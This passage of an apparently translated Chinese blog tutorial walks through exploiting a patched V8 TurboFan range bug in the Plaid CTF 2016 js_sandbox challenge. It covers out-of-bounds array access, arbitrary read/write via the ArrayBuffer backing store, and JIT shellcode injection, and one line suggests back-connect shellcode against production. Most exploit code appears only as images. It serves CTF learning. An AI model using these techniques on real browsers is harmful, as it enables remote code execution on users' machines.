[t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="Numerical-conversion-tool-It-is-original-work"><a href="#Numerical-conversion-tool-It-is-original-work" class="headerlink" title="Numerical conversion tool (It is original work)"></a>Numerical conversion tool (It is original work)</h3><ul><li>在开始JavaScript利用之前<ul><li>频繁转换unsigned long long &lt;-&gt; double</li><li>预先制作转换工具很好</li><li>我制作了以下工具（我不会使用float，但只是为了确保）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-163249.png" alt=""></li></ul></li><li>源代码看起来像这样<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-163655.png" alt=""></li></ul><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><ul><li>Plaid CTF 2016 -Pwnables 666pts –js_sandbox<ul><li>下载链接<br><a href="https://goo.gl/Se5HTy" target="_blank" rel="noopener">https://goo.gl/Se5HTy</a></li><li>问题<br>Can you get a flag off of this site(<a href="http://js.pwning.xxx:27251/)?" target="_blank" rel="noopener">http://js.pwning.xxx:27251/)?</a><br>If so, I’ve got 666 points with your name on it!</li></ul></li></ul><h2 id="攻略方法-1"><a href="#攻略方法-1" class="headerlink" title="攻略方法"></a>攻略方法</h2><ul><li>模式1和2，策略如下</li></ul><ol><li>创建一个用于调试的js环境版本<br>如果有一个包含漏洞的patch，hit和build它。</li><li>分析patch以确定哪个patch适用于哪个进程<br> Full-Codegen, Crankshaft, TurboFan, Ignition, AST, IC, …<br> Full-Codegen and Crankshaft do not exist in V8 as of 2018 (see below)</li><li>编写利用漏洞的js代码段<br> Think JavaScript code that causes patched parts to pass and causes bugs</li><li>创建一个任意地址读/写的原语<br> 主要使用ArrayBuffer和TypedArray</li><li>getshell<br> 由于这是Pwn类别的问题，getshell是第一目标。<br> 在JIT区域嵌入shell代码经常被使用</li></ol><h2 id="初步调查"><a href="#初步调查" class="headerlink" title="初步调查"></a>初步调查</h2><ul><li>Plaid CTF 2016-Pwnable 666pts -js_sandbox<ul><li>访问<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-084413.png" alt=""></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-084947.png" alt=""><br><a href="http://js.pwning.xxx:27251/files/problem.patch" target="_blank" rel="noopener">http://js.pwning.xxx:27251/files/problem.patch</a><br><a href="https://developers.google.com/v8/" target="_blank" rel="noopener">https://developers.google.com/v8/</a><br><a href="http://js.pwning.xxx:27251/file" target="_blank" rel="noopener">http://js.pwning.xxx:27251/file</a><br>提供了5个文件作为capture的必要文件。</p><ol><li>libc.so.6<br>当前的libc（ubuntu14.04)</li><li>natives_blob.bin<br>shell操作所需的文件</li><li>problem.patch<br>有漏洞的v8 patch</li><li>shell<br>构建samples/shell.cc用于本地测试</li><li>snapshot_blob.bin<br>shell操作所需的文件</li></ol><h2 id="shell文件"><a href="#shell文件" class="headerlink" title="shell文件"></a>shell文件</h2><p>shell (and *.blob)用作debug的目的<br>distribution file应该包含与problem服务器相同的源文件<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-091059.png" alt=""></p><ul><li>V8解释和执行的是JavaScript<ul><li>因此，exploit也只需要用JavaScript编写</li></ul></li><li>对于相同的输入，V8应该表现相同<ul><li>如果你可以通过shell来exp v8，你也可以通过Web服务器exp v8<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-092056.png" alt=""></li></ul></li></ul><h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><ol><li>启用PIE，FORTIFY_SOURCE，stack canary<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-092935.png" alt=""></li><li>PIE，FULL-RELRO启用<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-093123.png" alt=""></li><li>使read和load函数无效<br>print，read，load，quit和version等功能都是在sample/shell.cc中专门定义的，但是经过patch后，read和load时会失效<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-093555.png" alt=""></li><li>从源代码路径，TurboFan相关补丁和猜测<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-093840.png" alt=""><br>lhs：左手侧（左侧）rhs：右手侧（右侧）？<br>此外，因为函数名称是JSAddRanger，所以可以预料可能是与加法有关的漏洞（？）</li></ol><h2 id="Identification-of-calling-conditions"><a href="#Identification-of-calling-conditions" class="headerlink" title="Identification of calling conditions"></a>Identification of calling conditions</h2><ul><li>假设被patch的函数是有漏洞的<ul><li>我想调用这个函数<ul><li>如果我们不能调用这个函数，我们不能触发漏洞</li></ul></li><li>怎么调用它？<ul><li>我没有任何提示，我只有一个函数名称</li><li>猜测这个函数所在的文件或目录有什么功能</li><li>从该函数的调用回溯，找到调用路径。</li><li>最终目标是找到读取和调用每个函数的条件。</li></ul></li></ul></li></ul><h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><p>尝试google搜索函数名称<br>触及此功能的评论页尤为重要<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-101230.png" alt=""></p><h3 id="确认内置漏洞的文件名"><a href="#确认内置漏洞的文件名" class="headerlink" title="确认内置漏洞的文件名"></a>确认内置漏洞的文件名</h3><ul><li>src/compiler/typer.cc<ul><li>由于它是src/compiler/下的一个文件，因此它被认为与TurboFan有关<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-104240.png" alt=""></li></ul></li></ul><h3 id="确定来源"><a href="#确定来源" class="headerlink" title="确定来源"></a>确定来源</h3><ul><li>检查修补程序周围的代码<ul><li>看看JSAddRanger()<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-104616.png" alt=""></li></ul></li></ul><h3 id="确定调用路径"><a href="#确定调用路径" class="headerlink" title="确定调用路径"></a>确定调用路径</h3><ul><li>到目前为止，做一个总结<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-104852.png" alt=""></li><li>寻找调用路径<ul><li>使用gdb回溯调用栈是最快的方法。</li></ul></li><li><p>编写测试代码</p><ul><li>准备Javascript code去调用TurboFan<ul><li>通过代码调用函数10000次，由于我想调用TurboFan，所以不要忘记使用with语句<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-10-111002.png" alt=""></li></ul></li></ul></li><li><p>使用gdb运行</p><ul><li>如果某些条件不满足，JSAddRanger（）将不会调用…</li><li>In C ++ that does not reach JSAddRanger () in test code, that is, it does not reach the JSAddRanger () in the test code, you can not set a breakpoint unless you specify not only the function name but also the namespace and type to which it belongs. So using nm, it searches for mangled function names and specifies a breakpoint (if PIE is invalid, it is OK even if you set a breakpoint at the found address)</li><li>实际上，您无法在测试代码中访问JSAddRanger（）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134138.png" alt=""></li></ul></li><li>调用JSAddRanger（）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134445.png" alt=""><br>图示第一行是函数原型，第二行是函数定义，看看第三行。<ul><li>从JSAddTyper()调用。<ul><li>除非满足某些条件，否则不会调用JSAddRanger()<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134751.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134814.png" alt=""></li></ul></li></ul></li><li>同时检查JSAddTyper()的调用者<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-134854.png" alt=""><ul><li>在函数定义中只找到一个地方<ul><li>由于无法用简单的grep找到它，因此很有可能涉及宏。<ul><li>追溯更多来源是很麻烦的</li></ul></li></ul></li><li>在JSAddTyper()上放置一个断点并查看是否能在测试代码中断下来<ul><li>如果没有断下，努力尝试，阅读源码，进一步回溯</li></ul></li><li>使用gdb运行<ul><li>在JSAddTyper()上放置一个断点,发现停在断点处<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-135415.png" alt=""></li></ul></li></ul></li><li>在停止后进行回溯（查看调用栈）<ul><li>从这个函数名，可以确认JSAddRanger()和JSAddTyper()与优化编译器（TurboFan）相关<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-140004.png" alt=""></li><li>由于它是TyperPhase::Run，证明它是一个关于TurboFan优化中“Typer”阶段的函数。<br>另外，如果TurboFan进行了优化编译运行，就会发现JSAddTyper()在测试代码中被调用。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-140235.png" alt=""></li></ul></li><li>您可以在TyperPhase中看到TurboFan的功能<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-140844.png" alt=""></li><li>到目前为止做一个总结<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-141035.png" alt=""></li><li>JSAddRanger()调用条件探索<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-141136.png" alt=""><ul><li>lhs-&gt; IsRange（）&amp;&amp; rhs-&gt; IsRange（）</li><li>首先，代码中出现的Range是什么？<ul><li>为了知道这一点，我们需要更多地了解TurboFan的优化机制</li></ul></li></ul></li></ul><h3 id="Typer和Range调查"><a href="#Typer和Range调查" class="headerlink" title="Typer和Range调查"></a>Typer和Range调查</h3><ul><li>了解V8的优化（特别是Typer和Range相关）<ul><li>GitHub中有很多链接，从上往下依次阅读<ul><li><a href="https://github.com/v8/v8/wiki/TurboFan" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/TurboFan</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-143220.png" alt=""></li></ul></li></ul></li><li>和Typer有关的材料<ul><li>TurboFan概述<ul><li><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-143941.png" alt=""></li></ul></li><li>Typer收集类型信息并在其他地方完成优化<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-144124.png" alt=""></li></ul></li><li>TurboFan’s JIT Design<ul><li><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-144643.png" alt=""></li><li>当JavaScript代码中的变量或值不确定时，表示可以读取的范围的变量或值可以作为范围读取</li><li>据此，JSAddRanger()在添加带有范围信息的不定变量时,会派生出一个新的范围<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-151437.png" alt=""></li></ul></li><li>Fast arithmetic for dynamic languages<br><a href="https://docs.google.com/presentation/d/1wZVIqJMODGFYggueQySdiA3tUYuHNMcyp_PndgXsO1Y/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1wZVIqJMODGFYggueQySdiA3tUYuHNMcyp_PndgXsO1Y/edit#slide=id.p</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-151643.png" alt=""><br>虽然它没有直接解释范围，但根据该图，似乎在使用AND操作时变成范围（可能是“％”，这也在MOD操作中）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152135.png" alt=""></li></ul><h3 id="确定调用条件"><a href="#确定调用条件" class="headerlink" title="确定调用条件"></a>确定调用条件</h3><ul><li>编写测试代码<ul><li>添加AND操作并在gdb下执行<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152345.png" alt=""></li><li>在此之后，在断点处停止<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152445.png" alt=""></li></ul></li><li>调用路径总结<br>  <img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-152615.png" alt=""></li></ul><h2 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h2><ul><li>补丁周围的代码<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-153051.png" alt=""></li><li>从操作实例理解<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-153234.png" alt=""></li><li><p>用make x64.debug -j 8重新编译</p><ul><li>在“环境设置”描述的步骤中，我已经预先构建了它。</li></ul></li><li><p>尝试有趣的测试case</p><ul><li>下面的JavaScript代码展示了有趣的结果<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-153628.png" alt=""></li><li>如果打了有漏洞的补丁，你会在AND操作之后得到新的范围信息，<strong>而这个范围信息是错误的</strong></li><li><strong>但是，由于该信息仅用作类型提示，因此它不会对选择Word32的类型造成影响，因为它可以用32位表示[0,24]和[0,16]。在这个例子里，f函数正常应该返回24作为结果</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-154204.png" alt=""></li></ul></li></ul><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p><a href="https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea" target="_blank" rel="noopener">https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>通过假的range信息，你能做什么？<ul><li>这里的目标是创建任意地址读/写的原语</li><li>具体来说，就是伪造一个很大的array的length<ul><li>许多JavaScript引擎的漏洞利用都是使用这种方法。</li></ul></li><li>OOB-RW (Out-Of-Bounds-Read/Write access)</li><li>如果在array之外读写数据，并劫持JSArrayBuffer的BackingStore的指针，就获胜。</li></ul></li><li>如何用OOB-RW创建任意地址读/写的原语<ul><li>内存排布如下<br>  <img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-155748.png" alt=""></li><li>如果可以模拟长度，就可以通过越界访问来更改JSArrayBuffer的BackingStore的指针<br><strong>基本形式如下</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-160205.png" alt=""></li></ul></li><li>通过range来实现我们的目的（改大array的length）<ul><li>正确的尝试<ul><li>首先用范围信息创建一个值</li><li>使用这个值来创建一个array</li></ul></li><li>测试代码看起来像这样<ul><li>变量sz具有范围信息<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-160615.png" alt=""></li></ul></li><li>修改源代码为有漏洞的版本<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-161055.png" alt=""></li><li>make x64.debug -j 8再次编译</li></ul></li><li>在gdb下运行，检查内存<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-161251.png" alt=""><ul><li>搜索0xdeadbee将命中3次，其中这个是一个数组（= FixedArray）</li><li>通过将标记值1加到FixedArray的地址上，然后进行搜索</li><li>找到的地址应该是JSArray<br><strong>一个很重要的图</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-163558.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-163924.png" alt=""><br>通过check我知道我能伪造FixedArray的长度，因为如果不打patch，上下的值应该都是0x18<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-164259.png" alt=""></li></ul></li><li>这意味着什么？<ul><li>我们打算创建一个长度0x18元素的数组，但实际上只准备了长度0x10元素的数组<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-165817.png" alt=""><br><strong>虽然它与基本形式稍有不同，但如果您仅信任此长度（0x18)，并将这个长度的值写入FixedArray，则您能够读取和写入的数据，将会超出原本仅有0x10的FixedArray</strong><br>实际上想用只有0x8个字节的数据来覆盖backing store ptr是十分困难的，我们将在后面介绍更好的方法。</li></ul></li></ul><h2 id="参考解说：typed-lowering"><a href="#参考解说：typed-lowering" class="headerlink" title="参考解说：typed-lowering"></a>参考解说：typed-lowering</h2><ul><li>为什么会出现这种情况？<ul><li>使用range信息的部分在哪里？<ul><li>在typer phase旁边的typed-lowering phase<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-170659.png" alt=""></li></ul></li></ul></li><li><p>typed-lowering</p><ul><li>它似乎使用type information来optimize graph</li><li>Follow until array association comes out<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171104.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171205.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171313.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171354.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171702.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-171753.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-172100.png" alt=""></li></ul></li><li><p>用printf调试确认<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-172253.png" alt=""></p></li></ul><h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><ul><li>你现在在做什么？<ul><li>Array length伪造</li></ul></li><li>我们将会考虑编写exp<ul><li>流程如下<ol><li>伪造Array length</li><li>伪造ArrayBuffer</li><li>Identify function object</li><li>在JIT区域嵌入shellcode</li></ol></li></ul></li></ul><h3 id="伪造Array-length"><a href="#伪造Array-length" class="headerlink" title="伪造Array length"></a>伪造Array length</h3><ol><li>顺次排列两个FixedArray（其长度通过range漏洞伪造）<br>由于这些FixedArrays的范围是伪造的，因此它们可以在数组之外进行读写操作.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173202.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173214.png" alt=""></li><li>每个double值存储在Element [0]中，并且数组类型被识别为double类型（即FixedArray被转换为FixedDoubleArray）<ul><li>在FixedArray变成FixedDoubleArrayed之后，内存的布局会发生变化并且变的很麻烦，所以让我们先提前认识它是一个只有double类型元素的FixedDoubleArray。<br>这也确保了FixedDoubleArray 1和2连接<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173539.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173723.png" alt=""></li></ul></li><li>使用OOB-W漏洞更新FixedDoubleArray1中的FixedDoubleArray 2的kLengthOffset<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-173919.png" alt=""><br>如果连续排列，FixedDoubleArray 1的元素[17]应该是kLengthOffset。<br>通过此更新，FixedDoubleArray 2可以越界读取和写入了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-174210.png" alt=""><br>其实我们不能直接访问Element [17]。</li></ol><ul><li>状态<br>在JSArray中，长度信息首先存储在两个地方。JSArray::kLengthOffset(= 24)和FixedArray::kLengthOffset(=16)</li><li>原因<br>当存储到一个数组时，它使用JSArray::kLengthOffset和FixedArray::kLengthOffset来进行索引的范围判断（可以确认的是，如果你通过gdb上的rwatch设置了一个内存访问断点，它将以任一方式停止）<br>17超出了FixedArray::kLengthOffset的范围，所以我们扩展了数组的长度并在其他地方预留了一个新数组。这不会成为OOB-RW。</li><li>解决方法<br>According to Write-up, it seems to be enough to substitute twice in the for statement as follows<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;24;i+=17)</span><br><span class="line">    Element[i]=value;</span><br></pre></td></tr></table></figure></li></ul><p>称为KeyedStore IC的IC对应于数组元素中的存储，KeyedStoreIC是状态直接转换为(0)-&gt;(1)的IC，IC在第二次访问时已处于活动状态.<br>当通过触发IC来处理时,它不会与JSArray::kLengthOffset或FixedArray::kLengthOffset进行比较（However, this is not exactly confirmed here, and only JSArray :: kLengthOffset comparison may be done on the code embedded in JIT）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184255.png" alt=""></p><h3 id="伪造ArrayBuffer"><a href="#伪造ArrayBuffer" class="headerlink" title="伪造ArrayBuffer"></a>伪造ArrayBuffer</h3><ol><li>将ArrayBuffer放置在FixedDoubleArray 1，2之后<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184358.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184411.png" alt=""></li><li><p>由FixedDoubleArray 2的漏洞搜索kByteLengthOffset和kBackingStoreOffset的偏移量</p><ul><li>它每次从FixedArray2的元素[16]中读取一个元素，并根据是否包含假定值进行搜索。 您可以在kByteLengthOffset（= ArrayBuffer拥有的BackingStore的长度）中放入一个特征值并搜索它（如果向此添加1，kBackingStoreOffset的偏移量也是已知的）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-184618.png" alt=""></li><li>ab_off表示从FixedArray 2（代码中的arr [1]）中看到的作为kByteLengthOffset位置的元素索引，</li></ul></li><li><p>更新来kByteLengthOffset和kBackingStoreOffset的偏移量</p><ul><li>如果设置元素[kByteLengthOffset_offset] = 0xfffff0，<br>元素[kByteLengthOffset_offset + 1] = rw_addr。<br>请记住在步骤2-2中获得的偏移量，并且在ArrayBuffer读取和写入rw_addr，也就是说，它几乎变成了任何内存读/写的原语。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185130.png" alt=""></li><li>通过重写kBackingStoreOffset的值，您可以读取和写入任意地址，因此在利用时可以将其作为RW原语的函数来实现。<br>另外，关于i2_to_d()的描述被省略了，它是一个函数，可以使用ArrayBuffer将Uint32转换为double。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185551.png" alt=""></li></ul></li></ol><h3 id="Identify-function-object"><a href="#Identify-function-object" class="headerlink" title="Identify function object"></a>Identify function object</h3><ol><li><p>ArrayBuffer后面跟着FixedArray 3，它有一个适当的函数对象作为元素<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185739.png" alt=""><br>选择7作为特征值没有特别的意义。 只要选择你喜欢的长度，然后尝试。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-185837.png" alt=""></p></li><li><p>从FixedDoubleArray 2中，使用漏洞探索FixedArray 3的Element的偏移量，获取函数f的对象地址。</p><ul><li>如果一个值连续出现kLengthOffset次（如图中是7），则可以推断出它可能是包含函数f的对象地址的元素的偏移量。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-190158.png" alt=""></li></ul></li></ol><h3 id="在JIT区域嵌入shellcode"><a href="#在JIT区域嵌入shellcode" class="headerlink" title="在JIT区域嵌入shellcode"></a>在JIT区域嵌入shellcode</h3><ol><li>通过将函数f的对象地址放入kBackingStoreOffset并读取第七个元素，获取kCodeEntryOffset中的JIT地址<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-190809.png" alt=""></li><li>将该地址放在kBackingStoreOffset中，用shellcode覆盖JIT区域，然后调用函数f（）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-190858.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191057.png" alt=""></li></ol><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><ul><li>I am rewriting a part of the author’s write-up<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191201.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191534.png" alt=""></li><li>Execute exploit code with V8 sample-shell<ul><li>你可以确认/bin/sh启动<br><img src="http://onc55v8te.bkt.clouddn.com/2018-06-11-191712.png" alt=""></li><li>虽然以上是针对自建shell执行的，即使对distributed shell执行了exploit代码，也应该启动/bin/sh</li><li>Then replace it with the shellcode to be backconnected, then try exploit to the production is OK</li></ul></li><li>除了本文中讨论的解决方案之外，PPP还使用GC实现了另外一种writeup<ul><li><a href="https://rzhou.org/~ricky/pctf2016/js_sandbox.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/pctf2016/js_sandbox.js</a></li><li>但是，从range伪造，到进行数组的OOB-RW的思路是相同的</li></ul></li></ul><h1 id="Bonus-Other-JavaScript-issues-and-links"><a href="#Bonus-Other-JavaScript-issues-and-links" class="headerlink" title="Bonus Other JavaScript issues and links"></a>Bonus Other JavaScript issues and links</h1><h2 id="V8"><a href="#V8" class="headerlink" title="V8"></a>V8</h2><ul><li>[SECUINSIDE 2014] Yet another Javascript jail - 300<br><a href="https://gist.github.com/anonymous/b2340ac8429f4c5d186c" target="_blank" rel="noopener">https://gist.github.com/anonymous/b2340ac8429f4c5d186c</a><br><a href="http://ddaa.logdown.com/posts/203080-secuinside-2014-pwn-300-yet-another-javascript-jail" target="_blank" rel="noopener">http://ddaa.logdown.com/posts/203080-secuinside-2014-pwn-300-yet-another-javascript-jail</a><br><a href="https://gist.github.com/potetisensei/9a41a1848da4021c29e5" target="_blank" rel="noopener">https://gist.github.com/potetisensei/9a41a1848da4021c29e5</a></li><li>[34c3 CTF 2017] v9<br><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a><br><a href="https://gist.github.com/itsZN/9ae6417129c6658130a898cdaba8d76c" target="_blank" rel="noopener">https://gist.github.com/itsZN/9ae6417129c6658130a898cdaba8d76c</a></li></ul><h2 id="SpiderMonkey"><a href="#SpiderMonkey" class="headerlink" title="SpiderMonkey"></a>SpiderMonkey</h2><ul><li>[33c3 CTF 2016] pwn600 -feuerfuchs<br><a href="https://github.com/saelo/feuerfuchs" target="_blank" rel="noopener">https://github.com/saelo/feuerfuchs</a><br><a href="https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" target="_blank" rel="noopener">https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/</a></li><li>[CodeGate 2017] JS World -pwnable500<br><a href="https://gist.github.com/akiym/966b3d24146edb685b8a08edee551de2" target="_blank" rel="noopener">https://gist.github.com/akiym/966b3d24146edb685b8a08edee551de2</a></li></ul><h2 id="Chakra"><a href="#Chakra" class="headerlink" title="Chakra"></a>Chakra</h2><ul><li>[PlaidCTF 2017] Chakrazy -Pwnable600<br><a href="https://lokalhost.pl/ctf/pcft2017_chakra.js" target="_blank" rel="noopener">https://lokalhost.pl/ctf/pcft2017_chakra.js</a><br><a href="https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" target="_blank" rel="noopener">https://bruce30262.github.io/2017/12/26/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/</a><br><a href="https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba" target="_blank" rel="noopener">https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba</a></li></ul><h2 id="WebKit-JSC"><a href="#WebKit-JSC" class="headerlink" title="WebKit-JSC"></a>WebKit-JSC</h2><ul><li>[BkP CTF 2016] qwn2own -pwn10<br><a href="https://github.com/kitctf/writeups/blob/master/bkp2016/qwn2own/index.html" target="_blank" rel="noopener">https://github.com/kitctf/writeups/blob/master/bkp2016/qwn2own/index.html</a><br><a href="https://rzhou.org/~ricky/bkpctf2016/qwn2own/test.js" target="_blank" rel="noopener">https://rzhou.org/~ricky/bkpctf2016/qwn2own/test.js</a><br><a href="http://vulph.com/2016/03/05/Boston-Key-Party-writeups.html" target="_blank" rel="noopener">http://vulph.com/2016/03/05/Boston-Key-Party-writeups.html</a><br><a href="https://github.com/acama/ctf/tree/master/bkpctf2016/qwn2own" target="_blank" rel="noopener">https://github.com/acama/ctf/tree/master/bkpctf2016/qwn2own</a><br><a href="http://lokalhost.pl/ctf/bkp2016/" target="_blank" rel="noopener">http://lokalhost.pl/ctf/bkp2016/</a><br><a href="http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16" target="_blank" rel="noopener">http://blog.frizn.fr/bkpctf-2016/qwn2own-bkpctf16</a></li></ul><h2 id="v8-exploit-study"><a href="#v8-exploit-study" class="headerlink" title="v8 exploit study"></a>v8 exploit study</h2><ul><li><a href="https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf" target="_blank" rel="noopener">https://cansecwest.com/slides/2017/CSW2017_QidanHe-GengmingLiu_Pwning_Nexus_of_Every_Pixel.pdf</a></li><li><p><a href="https://github.com/secmob/pwnfest2016/" target="_blank" rel="noopener">https://github.com/secmob/pwnfest2016/</a></p></li><li><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a></p></li><li><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" 